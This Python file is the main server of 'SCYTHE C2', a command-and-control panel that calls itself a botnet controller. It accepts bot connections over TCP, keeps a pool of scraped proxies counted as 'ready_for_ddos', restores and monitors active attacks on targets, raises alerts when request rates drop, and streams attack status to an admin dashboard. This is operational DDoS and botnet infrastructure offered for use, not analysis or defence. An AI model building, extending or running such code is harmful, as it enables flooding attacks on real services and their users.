#!/usr/bin/env python3
"""
SCYTHE C2 - Main Entry Point
Version: 1.0.1 - PROXY RACE FIX + WS BROADCAST + TCP BUFFER FIX
Fully synchronized with admin.html v8.3
"""

import asyncio
import json
import logging
import os
import sys
import socket
import time
from contextlib import asynccontextmanager
from typing import Any, Dict, List, Optional
from datetime import datetime

from fastapi import FastAPI, Request, Depends, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, StreamingResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
from starlette.exceptions import HTTPException as StarletteHTTPException
import uvicorn

# Import routes
from app.routes import (
    status,
    attack,
    history,
    proxy,
    botnet,
    config,
    service,
    auth
)

# Import core modules
from app.core.config import settings
from app.core.redis_client import get_redis, close_redis, RedisKeys
from app.core.logger import setup_logger
from app.core.auth import require_auth

# Import managers
from app.managers.attack_manager import AttackManager, attack_manager
from app.managers.proxy_manager import ProxyManager, proxy_manager
from app.managers.botnet_manager import BotnetManager, botnet_manager
from app.managers.concurrent_manager import ConcurrentManager, concurrent_manager
from app.managers.history_manager import HistoryManager, history_manager

# ========== LOGGER ==========
logger = setup_logger("scythe_c2")

# ========== GLOBAL MANAGERS (singletons) ==========
attack_mgr: AttackManager = attack_manager
proxy_mgr: ProxyManager = proxy_manager
botnet_mgr: BotnetManager = botnet_manager
concurrent_mgr: ConcurrentManager = concurrent_manager
history_mgr: HistoryManager = history_manager

# ========== WEBSOCKET CONNECTIONS ==========
websocket_connections: List[WebSocket] = []

async def broadcast_ws_message(msg_type: str, data: dict):
    msg = {"type": msg_type, "data": data}
    dead_connections = []
    for ws in websocket_connections:
        try:
            await ws.send_json(msg)
        except Exception:
            dead_connections.append(ws)
    for ws in dead_connections:
        if ws in websocket_connections:
            websocket_connections.remove(ws)

# ========== PROXY REFRESH LOG ==========
proxy_refresh_logs: List[dict] = []
MAX_REFRESH_LOGS = 50

async def log_proxy_refresh(source: str, total_scraped: int, alive_after_check: int,
                             success_rate: float, timestamp: Optional[float] = None):
    log_entry = {
        "timestamp": timestamp or time.time(),
        "source": source,
        "total_scraped": total_scraped,
        "alive_after_check": alive_after_check,
        "success_rate": success_rate,
    }
    proxy_refresh_logs.insert(0, log_entry)
    if len(proxy_refresh_logs) > MAX_REFRESH_LOGS:
        proxy_refresh_logs.pop()
    await broadcast_ws_message("proxy_scrap", log_entry)
    logger.info(f"[PROXY_LOG] {source}: {alive_after_check}/{total_scraped} alive ({success_rate:.1f}%)")

async def get_proxy_refresh_logs(limit: int = 20) -> List[dict]:
    return proxy_refresh_logs[:limit]

# ========== RPS ALERT SYSTEM ==========
rps_alert_history: List[dict] = []
MAX_ALERTS = 50

async def detect_rps_drop(attack_id: str, expected_rps: int, actual_rps: int) -> Optional[dict]:
    if expected_rps <= 0:
        return None
    drop_percent = ((expected_rps - actual_rps) / expected_rps) * 100
    if drop_percent < 20:
        return None
    if drop_percent >= 80:
        severity = "fatal"
    elif drop_percent >= 60:
        severity = "critical"
    else:
        severity = "warning"
    causes = []
    try:
        stats = await proxy_mgr.get_stats()
        if stats.alive < 50:
            causes.append("Proxy pool critically low")
    except:
        causes.append("Proxy stats unavailable")
    try:
        bot_ids = await botnet_mgr.get_active_bot_ids()
        if len(bot_ids) == 0:
            causes.append("No bots connected")
    except:
        causes.append("Botnet stats unavailable")
    if not causes:
        causes.append("Unknown - check network/target")
    alert = {
        "timestamp": time.time(),
        "attack_id": attack_id,
        "expected_rps": expected_rps,
        "actual_rps": actual_rps,
        "drop_percent": drop_percent,
        "severity": severity,
        "possible_causes": causes,
    }
    rps_alert_history.insert(0, alert)
    if len(rps_alert_history) > MAX_ALERTS:
        rps_alert_history.pop()
    await broadcast_ws_message("rps_alert", alert)
    logger.warning(f"[RPS_ALERT] {severity.upper()}: {attack_id} drop {drop_percent:.1f}%")
    return alert

async def get_rps_alerts(limit: int = 10) -> List[dict]:
    return rps_alert_history[:limit]

async def clear_rps_alerts():
    rps_alert_history.clear()
    logger.info("[RPS_ALERT] All alerts cleared")

# ========== PERIODIC UPDATE BROADCASTER ==========
async def periodic_update_broadcaster():
    while True:
        try:
            await asyncio.sleep(5)
            proxy_stats = {"alive": 0, "dead": 0}
            try:
                ps = await proxy_mgr.get_stats()
                proxy_stats = {"alive": ps.alive, "dead": ps.dead}
            except:
                pass
            attacks_data = []
            try:
                active = attack_mgr.get_active_attacks()
                for a in active:
                    attacks_data.append({
                        "id": a.id,
                        "method": a.method,
                        "target": a.target,
                        "rps": a.rps,
                        "total_requests": a.total_requests,
                    })
            except:
                pass
            bot_stats = {"active": 0}
            try:
                bot_ids = await botnet_mgr.get_active_bot_ids()
                bot_stats = {"active": len(bot_ids)}
            except:
                pass
            update_data = {
                "proxy": proxy_stats,
                "attacks": attacks_data,
                "bots": bot_stats,
                "timestamp": time.time(),
            }
            await broadcast_ws_message("periodic_update", update_data)
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"[PERIODIC] Broadcaster error: {e}")
            await asyncio.sleep(5)

# ========== TCP SERVER FOR BOTS ==========
async def handle_bot(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    addr = writer.get_extra_info("peername")
    bot_id = None
    logger.info(f"Raw bot connection from {addr}")
    try:
        while True:
            try:
                data = await reader.readline()
            except (ConnectionResetError, BrokenPipeError) as e:
                logger.warning(f"Bot {addr} connection reset: {e}")
                break
            except asyncio.CancelledError:
                raise
            except Exception as e:
                logger.error(f"Unexpected error reading from {addr}: {e}")
                break
            if not data:
                break
            try:
                msg = json.loads(data.decode().strip())
                if msg.get("type") == "register":
                    bot_id = msg.get("id")
                await botnet_mgr.handle_message(writer, msg)
            except json.JSONDecodeError:
                logger.warning(f"Invalid JSON from {addr}: {data[:100]}")
            except Exception as e:
                logger.error(f"Error processing message from {addr}: {e}")
    except asyncio.CancelledError:
        logger.info(f"Bot {addr} connection cancelled")
    except Exception as e:
        logger.error(f"Bot connection error from {addr}: {e}")
    finally:
        if bot_id:
            logger.info(f"Bot {bot_id} disconnecting, removing from active_writers")
            await botnet_mgr.remove_bot_on_disconnect(bot_id)
        try:
            writer.close()
            await writer.wait_closed()
        except:
            pass
        logger.info(f"Bot {addr} disconnected")

async def start_tcp_server():
    try:
        # FIX: Increase TCP buffer for large bot reports
        server = await asyncio.start_server(
            handle_bot,
            host="0.0.0.0",
            port=settings.C2_PORT,
            limit=8192 * 1024  # 8MB buffer (was 1MB)
        )
        logger.info(f"TCP Server created, about to serve on port {settings.C2_PORT}")
        async with server:
            await server.serve_forever()
    except Exception as e:
        logger.error(f"Failed to start TCP server: {e}")
        raise

# ========== LIFESPAN ==========
@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("=" * 70)
    logger.info("  SCYTHE C2 v1.0.1 - Professional Botnet Controller")
    logger.info("  FIX: Proxy race condition, WS broadcast, TCP buffer")
    logger.info("=" * 70)
    logger.info(f"  API Port     : {settings.API_PORT}")
    logger.info(f"  C2 Port      : {settings.C2_PORT}")
    logger.info(f"  Redis        : {settings.REDIS_URL}")
    logger.info(f"  History DB   : {settings.HISTORY_DB}")
    logger.info(f"  Max Concurrent: {settings.MAX_CONCURRENT}")
    logger.info("=" * 70)

    # 1. Connect to Redis
    try:
        redis = await get_redis()
        await redis.ping()
        logger.info("Redis connected successfully.")
    except Exception as e:
        logger.error(f"Redis connection failed: {e}")
        sys.exit(1)

    # 2. Initialize managers
    logger.info("Initializing managers...")
    concurrent_mgr._redis = redis
    await concurrent_mgr.initialize()
    try:
        await attack_mgr.restore_from_redis()
        logger.info("Restored active attacks from Redis")
    except Exception as e:
        logger.warning(f"Failed to restore attacks: {e}")
    await botnet_mgr.start()
    await history_mgr.initialize()

    # 3. Start TCP server FIRST (so bots can connect immediately)
    tcp_task = asyncio.create_task(start_tcp_server())
    logger.info(f"TCP Bot server listening on port {settings.C2_PORT}")

    # 4. Start proxy_manager background refresh (AFTER TCP server, non-blocking)
    proxy_refresh_task = asyncio.create_task(proxy_mgr.start_background_refresh())
    logger.info("Proxy background refresh started (non-blocking)")

    # 5. Start periodic update broadcaster
    broadcaster_task = asyncio.create_task(periodic_update_broadcaster())
    logger.info("Periodic update broadcaster started")

    async def periodic_health():
        while True:
            await asyncio.sleep(60)
            try:
                await redis.ping()
            except:
                logger.error("Redis health check failed")
    health_task = asyncio.create_task(periodic_health())

    # 6. Store managers in app.state
    app.state.attack_manager = attack_mgr
    app.state.proxy_manager = proxy_mgr
    app.state.botnet_manager = botnet_mgr
    app.state.concurrent_manager = concurrent_mgr
    app.state.history_manager = history_mgr
    app.state.redis = redis

    logger.info("All components initialized successfully.")
    logger.info("SCYTHE C2 is ready to serve.")
    logger.info("-" * 70)

    yield

    # Shutdown
    logger.info("Shutting down SCYTHE C2 server...")
    tcp_task.cancel()
    broadcaster_task.cancel()
    health_task.cancel()
    try:
        proxy_refresh_task.cancel()
    except:
        pass
    await proxy_mgr.stop()
    await botnet_mgr.stop()
    await close_redis()
    logger.info("Shutdown complete.")

# ========== FASTAPI APP ==========
app = FastAPI(
    title="SCYTHE C2 API",
    version="1.0.1",
    description="C2 Server for SCYTHE Botnet & Attack System - Proxy Race Fix",
    lifespan=lifespan
)

# ========== EXCEPTION HANDLERS ==========
@app.exception_handler(StarletteHTTPException)
async def custom_http_exception_handler(request: Request, exc: StarletteHTTPException):
    if exc.status_code == 307 and exc.headers and exc.headers.get("Location"):
        return RedirectResponse(url=exc.headers["Location"], status_code=302)
    if exc.status_code in (401, 403):
        accept = request.headers.get("accept", "")
        if "text/html" in accept or "*/*" in accept:
            return RedirectResponse(url="/login", status_code=302)
    return JSONResponse(
        status_code=exc.status_code,
        content={"detail": exc.detail}
    )

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Templates
templates = Jinja2Templates(directory="app/templates")

# Routes
app.include_router(status.router)
app.include_router(attack.router)
app.include_router(history.router)
app.include_router(proxy.router)
app.include_router(botnet.router)
app.include_router(config.router)
app.include_router(service.router)
app.include_router(auth.router)

# WebSocket
@app.websocket("/admin/ws")
async def admin_websocket(websocket: WebSocket):
    await websocket.accept()
    websocket_connections.append(websocket)
    logger.info(f"WebSocket client connected. Total: {len(websocket_connections)}")
    try:
        await websocket.send_json({
            "type": "connected",
            "data": {"message": "SCYTHE C2 Admin WebSocket connected"}
        })
        while True:
            try:
                msg = await websocket.receive_text()
                data = json.loads(msg)
                if data.get("action") == "ping":
                    await websocket.send_json({"type": "pong", "data": {"time": time.time()}})
                elif data.get("action") == "get_proxy_logs":
                    logs = await get_proxy_refresh_logs(data.get("limit", 20))
                    await websocket.send_json({"type": "proxy_logs", "data": logs})
                elif data.get("action") == "get_rps_alerts":
                    alerts = await get_rps_alerts(data.get("limit", 10))
                    await websocket.send_json({"type": "rps_alerts", "data": alerts})
                elif data.get("action") == "clear_rps_alerts":
                    await clear_rps_alerts()
                    await websocket.send_json({"type": "alerts_cleared", "data": {}})
                else:
                    await websocket.send_json({"type": "error", "data": {"message": "Unknown action"}})
            except json.JSONDecodeError:
                await websocket.send_json({"type": "error", "data": {"message": "Invalid JSON"}})
            except Exception as e:
                logger.error(f"WebSocket message error: {e}")
                break
    except WebSocketDisconnect:
        logger.info("WebSocket client disconnected")
    except Exception as e:
        logger.error(f"WebSocket error: {e}")
    finally:
        if websocket in websocket_connections:
            websocket_connections.remove(websocket)
        logger.info(f"WebSocket client removed. Total: {len(websocket_connections)}")

# SSE
@app.get("/api/stream")
async def sse_stream(request: Request):
    async def event_generator():
        while True:
            if await request.is_disconnected():
                break
            try:
                active_count = 0
                total_rps = 0
                try:
                    active = attack_mgr.get_active_attacks()
                    active_count = len(active)
                    total_rps = sum(a.rps for a in active)
                except:
                    pass
                proxy_alive = 0
                try:
                    ps = await proxy_mgr.get_stats()
                    proxy_alive = ps.alive
                except:
                    pass
                bot_count = 0
                try:
                    bot_ids = await botnet_mgr.get_active_bot_ids()
                    bot_count = len(bot_ids)
                except:
                    pass
                data = {
                    "active_attacks": active_count,
                    "total_rps": total_rps,
                    "proxy_alive": proxy_alive,
                    "bot_count": bot_count,
                    "timestamp": time.time(),
                }
                yield f"data: {json.dumps(data)}\n\n"
            except Exception as e:
                logger.error(f"SSE error: {e}")
                yield f"data: {json.dumps({'error': str(e)})}\n\n"
            await asyncio.sleep(2)
    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        }
    )

# Live proxy monitor
@app.get("/api/proxy/monitor")
async def get_proxy_monitor():
    try:
        stats = await proxy_mgr.get_stats()
        health = await proxy_mgr.get_pool_health()
        sources = await proxy_mgr.get_top_sources()
        logs = await get_proxy_refresh_logs(20)
        return JSONResponse(content={
            "success": True,
            "total_scraped": stats.total,
            "alive_after_check": stats.alive,
            "ready_for_ddos": stats.alive,
            "fast_proxies": stats.fast,
            "dead_proxies": stats.dead,
            "last_refresh": stats.last_scrap,
            "sources": sources,
            "recent_logs": logs,
            "can_attack": stats.alive >= 50,
        })
    except Exception as e:
        logger.error(f"Error getting proxy monitor: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/proxy/refresh-logs")
async def get_proxy_refresh_logs_endpoint(limit: int = 20):
    logs = await get_proxy_refresh_logs(limit)
    return JSONResponse(content={
        "success": True,
        "logs": logs,
        "count": len(logs),
    })

# RPS alerts
@app.get("/api/alerts/rps")
async def get_rps_alerts_endpoint(limit: int = 10):
    alerts = await get_rps_alerts(limit)
    return JSONResponse(content={
        "success": True,
        "alerts": alerts,
        "count": len(alerts),
    })

@app.post("/api/alerts/rps/clear")
async def clear_rps_alerts_endpoint():
    await clear_rps_alerts()
    return JSONResponse(content={
        "success": True,
        "message": "All RPS alerts cleared",
    })

@app.post("/api/alerts/rps/test")
async def test_rps_alert():
    test_alert = {
        "timestamp": time.time(),
        "attack_id": "test-attack-12345",
        "expected_rps": 1500,
        "actual_rps": 800,
        "drop_percent": 46.7,
        "severity": "warning",
        "possible_causes": ["Test alert", "Proxy pool low", "Bot disconnect"],
    }
    rps_alert_history.insert(0, test_alert)
    if len(rps_alert_history) > MAX_ALERTS:
        rps_alert_history.pop()
    await broadcast_ws_message("rps_alert", test_alert)
    return JSONResponse(content={
        "success": True,
        "message": "Test alert triggered",
        "alert": test_alert,
    })

# Frontend
@app.get("/", dependencies=[Depends(require_auth)], response_class=HTMLResponse)
async def dashboard(request: Request):
    return templates.TemplateResponse("dashboard.html", {"request": request})

@app.get("/admin", dependencies=[Depends(require_auth)], response_class=HTMLResponse)
async def admin_panel(request: Request):
    return templates.TemplateResponse("admin.html", {"request": request})

# Info
@app.get("/info")
async def get_info():
    redis_status = "connected"
    try:
        redis = await get_redis()
        await redis.ping()
    except:
        redis_status = "disconnected"
    active_count = 0
    try:
        active_count = len(attack_mgr.active_attacks) if attack_mgr else 0
    except:
        pass
    alive_proxies = 0
    try:
        alive_proxies = len(await proxy_mgr.get_alive_proxies()) if proxy_mgr else 0
    except:
        pass
    return {
        "name": "SCYTHE C2",
        "version": "1.0.1",
        "api_port": settings.API_PORT,
        "c2_port": settings.C2_PORT,
        "max_concurrent": settings.MAX_CONCURRENT,
        "redis": redis_status,
        "status": "operational",
        "active_attacks": active_count,
        "alive_proxies": alive_proxies,
    }

# Health
@app.get("/health")
async def health_check():
    try:
        redis = await get_redis()
        await redis.ping()
        return {"status": "healthy", "redis": "ok"}
    except:
        return JSONResponse(
            status_code=503,
            content={"status": "unhealthy", "redis": "disconnected"}
        )

# Main
if __name__ == "__main__":
    os.makedirs("app/templates", exist_ok=True)
    os.makedirs("logs", exist_ok=True)
    os.makedirs("data", exist_ok=True)
    uvicorn.run(
        "app.main:app",
        host=settings.HOST,
        port=settings.API_PORT,
        log_level=settings.LOG_LEVEL.lower(),
        reload=settings.DEBUG
    )
